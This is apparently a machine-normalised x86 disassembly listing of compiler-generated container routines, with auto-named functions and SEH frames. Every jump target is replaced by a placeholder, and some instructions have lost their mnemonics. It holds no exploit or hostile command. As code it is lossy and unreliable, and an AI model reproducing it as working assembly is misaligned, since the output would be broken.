mov edi [ esp + 0x34 ]
cmp esi edi
je r-xdata
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
jbe r-xdata
cmp [ esp + 0x1c ] 0x63
mov esi 0xf
mov [ esp + 0x8c ] esi
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] bl
mov [ esp + 0x138 ] 0x1
jne r-xdata
mov eax [ esp + 0x78 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
mov edi 0x10
push ebx
mov ecx esi
call sub_4019b0
add esi 0x1c
cmp esi edi
jne r-xdata
cmp [ esp + 0x54 ] edi
mov [ esp + 0x138 ] bl
jb r-xdata
mov eax [ esp + 0x20 ]
cmp eax ebx
je r-xdata
mov esi [ esp + 0x30 ]
cmp [ ebp ] bl
mov [ esp + 0x54 ] esi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
jne r-xdata
mov eax [ esp + 0x40 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec edx
cmp edx ebx
mov [ eax ] edx
jne r-xdata
mov edi 0xf
mov [ esp + 0x54 ] edi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
cmp [ ebp ] 0x5b
mov [ esp + 0x138 ] 0x1
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
sub_417280
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x1
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
push edx
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
lea edx [ esp + 0x14 ]
mov [ eax ] ecx
push edx
mov ecx esi
call sub_417320
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x1
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_4172f0
add esp 0x14
add edi 0x2
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_4172f0
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
mov edx [ esp + 0xc ]
mov ecx eax
mov eax [ esp + 0x4 ]
push esi
add eax 0x2
dec ecx
jne r-xdata
mov si [ edx ]
mov [ eax ] si
test eax eax
je r-xdata
pop esi
sub_417320
mov edx [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
je r-xdata
xor edi edi
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x1
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] edx
call sub_417370
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0xc ]
lea edx [ ecx + edi * 2 ]
pop edi
mov [ eax ] edx
pop esi
retn 0xc
mov edi edx
sub edi ecx
sar edi 0x1
sub_417370
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf840
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov cx [ eax ]
mov [ ebp + 0x10 ] cx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
mov [ ebp - 0x10 ] esp
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x1
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_40bf80
mov edi 0x7fffffff
sub edi edx
cmp edi ebx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x1
xor edx edx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov ecx eax
sub ecx edi
sar ecx 0x1
cmp ecx ebx
mov [ ebp + 0xc ] eax
jae r-xdata
mov edx eax
shr edx 0x1
mov edi 0x7fffffff
sub edi edx
cmp edi eax
jae r-xdata
add edx ebx
cmp eax edx
jae r-xdata
push eax
push ecx
mov ecx esp
lea edx [ ebx + ebx ]
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov ebx eax
mov ecx esp
sub ebx edx
mov [ ecx ] ebx
mov [ ebp + 0x8 ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
call sub_417620
mov [ esi + 0x8 ] eax
mov eax ebx
cmp edi eax
je r-xdata
lea ecx [ ebx + ebx ]
mov [ ebp + 0x8 ] ecx
add ecx edi
push ecx
push ecx
mov ecx esp
mov [ ebp + 0xc ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp + 0xc ] esp
mov [ eax ] edi
call sub_417620
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx eax
sub edx edi
push ecx
sar edx 0x1
sub ebx edx
push esi
lea edx [ ebp + 0x10 ]
push edx
push ebx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4172f0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
add edx eax
mov [ esi + 0x8 ] edx
mov esi edx
sub esi eax
add esp 0x14
cmp edi esi
je r-xdata
add eax edx
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edi ]
cmp edi ecx
mov eax edi
je r-xdata
mov ecx [ ebp + 0xc ]
sub ecx eax
mov edi edi
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x1
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
lea esp [ esp ]
mov dx [ eax - 0x2 ]
sub eax 0x2
cmp eax edi
mov [ ecx + eax ] dx
jne r-xdata
mov ax [ ebp + 0x10 ]
mov [ edi ] ax
add edi 0x2
cmp edi esi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
add eax eax
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0x8 ]
add esp 0x4
push eax
push ecx
mov [ ebp + 0xc ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] edx
mov ecx [ esi + 0x4 ]
mov eax esp
mov [ eax ] ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esp
call sub_417620
mov edx [ ebp + 0x8 ]
push edx
mov edi eax
push esi
lea eax [ ebp + 0x10 ]
push eax
push ebx
push edi
call sub_4172f0
mov edx [ ebp + 0x8 ]
add esp 0x14
lea eax [ edi + ebx * 2 ]
push eax
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edx
call sub_417620
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edx ebx
cmp eax edx
jae r-xdata
mov dx [ ebp + 0x10 ]
mov [ eax ] dx
add eax 0x2
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
add ecx eax
lea edx [ eax + ebx * 2 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add ebx eax
test ecx ecx
je r-xdata
add eax ebx
sub_417620
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push ecx
mov ecx [ esp + 0x14 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_417650
add esp 0x10
retn 0xc
sub_417650
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push ecx
push edx
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_417680
add esp 0x14
retn
sub_417680
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push esi
add ecx 0x2
add eax 0x2
cmp ecx edx
jne r-xdata
mov si [ ecx ]
mov [ eax ] si
test eax eax
je r-xdata
pop esi
sub_4176b0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
push edx
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
lea edx [ esp + 0x14 ]
mov [ eax ] ecx
push edx
mov ecx esi
call sub_417780
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_417720
add esp 0x14
add edi 0x8
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_417720
push 0xffffffff
push sub_4bf861
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push esi
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
test ecx ecx
je r-xdata
dec esi
add ecx 0x8
jmp r-xdata
cmp [ edx ] 0x63
jne r-xdata
test esi esi
jbe r-xdata
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
inc [ eax + 0x4 ]
sub_417780
mov edx [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
je r-xdata
xor edi edi
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] edx
call sub_4177d0
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0xc ]
lea edx [ ecx + edi * 8 ]
pop edi
mov [ eax ] edx
pop esi
retn 0xc
mov edi edx
sub edi ecx
sar edi 0x3
sub_4177d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf878
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x63
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] edx
mov ecx [ esi + 0x4 ]
xor edi edi
cmp ecx edi
mov [ ebp - 0x4 ] edi
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
inc [ ecx + 0x4 ]
cmp [ ebp - 0x28 ] 0x63
mov [ ebp - 0x4 ] 0xffffffff
jne r-xdata
cmp ecx edi
je r-xdata
mov edx [ ebp + 0xc ]
cmp edx edi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x24 ]
test ecx ecx
je r-xdata
mov ebx 0x1fffffff
sub ebx edi
cmp ebx edx
jae r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
dec [ ecx + 0x4 ]
jne r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_40bf80
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x1fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi edx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x3
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x10 ] edx
mov [ ebp + 0xc ] eax
call sub_417b30
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp - 0x20 ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_417b00
mov eax [ ebp + 0x10 ]
lea esi [ eax + edi ]
add esp 0x10
cmp edi esi
je r-xdata
lea eax [ edx * 8 ]
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x20 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x20 ] esp
mov [ eax ] edi
call sub_417b30
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx ecx
sub edx edi
sar edx 0x3
sub eax edx
mov edx [ ebp + 0xc ]
push edx
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
push ecx
mov [ ebp - 0x4 ] 0x3
call sub_417720
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
add edx eax
mov [ esi + 0x8 ] edx
mov esi edx
sub esi eax
add esp 0x14
cmp edi esi
mov [ ebp - 0x4 ] 0x0
je r-xdata
add eax edi
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx edi
call sub_40b0b0
add edi 0x8
cmp edi esi
jne r-xdata
nop
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
call sub_40b0b0
add edi 0x8
cmp edi esi
jne r-xdata
jmp r-xdata
shl eax 0x3
push eax
mov [ ebp - 0x18 ] eax
call sub_4b573e
mov edi eax
add esp 0x4
push edi
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ ebp - 0x20 ] esp
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
push ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x1c ] edi
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x20 ] esp
mov [ eax ] edx
call sub_417b30
mov edx [ ebp + 0xc ]
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp - 0x28 ]
push ecx
push edx
push ebx
mov [ ebp + 0x10 ] ebx
call sub_417720
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
lea eax [ ebx + eax * 8 ]
add esp 0x14
push eax
push ecx
mov ecx [ esi + 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ ebp - 0x20 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x20 ] esp
mov [ eax ] edx
call sub_417b30
mov ecx [ esi + 0x4 ]
test ecx ecx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
test ecx ecx
jne r-xdata
add edi edx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax edi
lea ecx [ edi + ebx * 8 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edi
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push esi
push eax
push ecx
call sub_40bbe0
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov ebx [ ebp + 0xc ]
add ebx eax
test ecx ecx
je r-xdata
add eax edx
sub_417b00
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
push edi
mov edi [ esp + 0x1c ]
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub edi 0x8
sub esi 0x8
push esi
mov ecx edi
call sub_40b0b0
cmp esi ebx
jne r-xdata
sub_417b30
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push ecx
mov ecx [ esp + 0x14 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_417b60
add esp 0x10
retn 0xc
sub_417b60
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push ecx
push edx
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_417b90
add esp 0x14
retn
sub_417b90
push 0xffffffff
push sub_4bee81
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push esi
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
test eax eax
je r-xdata
add eax 0x8
add ecx 0x8
jmp r-xdata
cmp [ ecx ] 0x63
jne r-xdata
cmp ecx esi
je r-xdata
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
inc [ edx + 0x4 ]
sub_417bf0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
push edx
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
lea edx [ esp + 0x14 ]
mov [ eax ] ecx
push edx
mov ecx esi
call sub_417c60
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_460740
add esp 0x14
inc edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_417c60
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
mov ecx [ esp + 0xc ]
push edi
je r-xdata
xor edi edi
jmp r-xdata
mov edx [ esi + 0x8 ]
sub edx eax
mov [ esp + 0x10 ] edx
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x1
push ecx
mov eax esp
mov [ eax ] ecx
mov ecx esi
call sub_417cb0
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0xc ]
add ecx edi
pop edi
mov [ eax ] ecx
pop esi
retn 0xc
mov edi ecx
sub edi eax
sub_417cb0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf890
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov cl [ eax ]
mov eax [ esi + 0x4 ]
test eax eax
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x13 ] cl
jne r-xdata
mov ecx [ esi + 0xc ]
sub ecx eax
mov [ ebp - 0x14 ] ecx
mov edx ecx
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test eax eax
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
test eax eax
jne r-xdata
mov ecx esi
call sub_40bf80
or edi 0xffffffff
sub edi ecx
cmp edi ebx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov ecx eax
sub ecx edi
cmp ecx ebx
mov [ ebp + 0xc ] eax
jae r-xdata
mov ecx edx
shr ecx 0x1
or edi 0xffffffff
sub edi ecx
cmp edi edx
jae r-xdata
add ecx ebx
cmp edx ecx
jae r-xdata
push eax
push ecx
mov ecx esp
mov [ ebp + 0x8 ] esp
mov [ ecx ] eax
push ecx
mov ecx esp
sub eax ebx
mov [ ecx ] eax
mov [ ebp + 0x8 ] esp
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_417f50
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp edi eax
je r-xdata
lea edx [ edi + ebx ]
push edx
push ecx
mov ecx esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp + 0x8 ] esp
mov [ eax ] edi
call sub_417f50
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push edx
mov eax edi
push esi
sub eax ecx
lea edx [ ebp + 0x13 ]
push edx
add eax ebx
push eax
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_460740
mov eax [ esi + 0x8 ]
add eax ebx
mov [ esi + 0x8 ] eax
mov esi eax
sub esi ebx
add esp 0x14
cmp edi esi
mov eax edi
je r-xdata
add edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x14 ]
jmp r-xdata
lea ecx [ edi + ebx ]
cmp edi ecx
je r-xdata
mov esi [ ebp + 0xc ]
sub esi eax
lea esp [ esp ]
mov edi edi
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
test eax eax
jne r-xdata
mov al [ ebp + 0x13 ]
mov bl al
mov bh bl
sub ecx edi
mov edx ecx
shr ecx 0x2
mov eax ebx
shl eax 0x10
mov ax bx
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov dl [ eax - 0x1 ]
dec eax
cmp eax edi
mov [ esi + eax ] dl
jne r-xdata
mov cl [ ebp + 0x13 ]
mov [ eax ] cl
inc eax
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push edx
call sub_4b573e
mov edx [ ebp + 0x8 ]
add esp 0x4
push eax
push ecx
mov [ ebp + 0xc ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] edx
mov ecx [ esi + 0x4 ]
mov eax esp
mov [ eax ] ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esp
call sub_417f50
mov edx [ ebp + 0x8 ]
push edx
mov edi eax
push esi
lea eax [ ebp + 0x13 ]
push eax
push ebx
push edi
call sub_460740
mov edx [ ebp + 0x8 ]
add esp 0x14
add edi ebx
push edi
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edx
call sub_417f50
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
add ecx ebx
cmp edx ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx ]
lea ecx [ eax + ebx ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add ebx eax
test ecx ecx
je r-xdata
add ecx ebx
mov [ ebp - 0x14 ] ecx
mov edx ecx
sub_417f50
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push ecx
mov ecx [ esp + 0x14 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_417f80
add esp 0x10
retn 0xc
sub_417f80
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push ecx
push edx
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_45f6a0
add esp 0x14
retn
sub_417fb0
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
push edx
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
lea edx [ esp + 0x14 ]
mov [ eax ] ecx
push edx
mov ecx esi
call sub_418020
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_418020
mov edx [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
je r-xdata
xor edi edi
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] edx
call sub_418070
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0xc ]
lea edx [ ecx + edi * 4 ]
pop edi
mov [ eax ] edx
pop esi
retn 0xc
mov edi edx
sub edi ecx
sar edi 0x2
sub_418070
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf8a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
mov [ ebp - 0x10 ] esp
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x2
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_40bf80
mov edi 0x3fffffff
sub edi edx
cmp edi ebx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x2
xor edx edx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov ecx eax
sub ecx edi
sar ecx 0x2
cmp ecx ebx
mov [ ebp + 0xc ] eax
jae r-xdata
mov edx eax
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi eax
jae r-xdata
add edx ebx
cmp eax edx
jae r-xdata
push eax
push ecx
mov ecx esp
lea edx [ ebx * 4 ]
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov ebx eax
mov ecx esp
sub ebx edx
mov [ ecx ] ebx
mov [ ebp + 0x8 ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
call sub_4162b0
mov [ esi + 0x8 ] eax
mov eax ebx
cmp edi eax
je r-xdata
lea ecx [ ebx * 4 ]
mov [ ebp + 0x8 ] ecx
add ecx edi
push ecx
push ecx
mov ecx esp
mov [ ebp + 0xc ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp + 0xc ] esp
mov [ eax ] edi
call sub_4162b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx eax
sub edx edi
